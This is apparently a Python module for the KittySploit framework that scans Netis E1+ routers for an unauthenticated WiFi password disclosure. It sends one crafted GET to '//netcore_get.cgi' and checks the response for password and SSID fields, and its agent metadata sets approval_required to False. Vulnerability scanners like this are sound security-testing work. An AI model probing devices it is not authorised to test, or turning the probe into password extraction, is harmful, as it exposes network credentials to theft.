#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability in Netis allows remote unauthenticated users to disclose the WiFi password of the remote devic."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Netis E1+ V1.2.32533 - WiFi Password Disclosure Detection',
        'description': 'A vulnerability in Netis allows remote unauthenticated users to disclose the WiFi password of the remote device.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'netis', 'exposure', 'edb', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://www.exploit-db.com/exploits/48384', 'https://www.netis-systems.com/'],
    }

    def run(self):
        path = '//netcore_get.cgi'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Cookie': 'homeFirstShow=yes'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('rp_ap_password', 'rp_ap_ssid',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Netis E1+ V1.2.32533 - WiFi Password Disclosure detected', path=path)
            return True
        return False

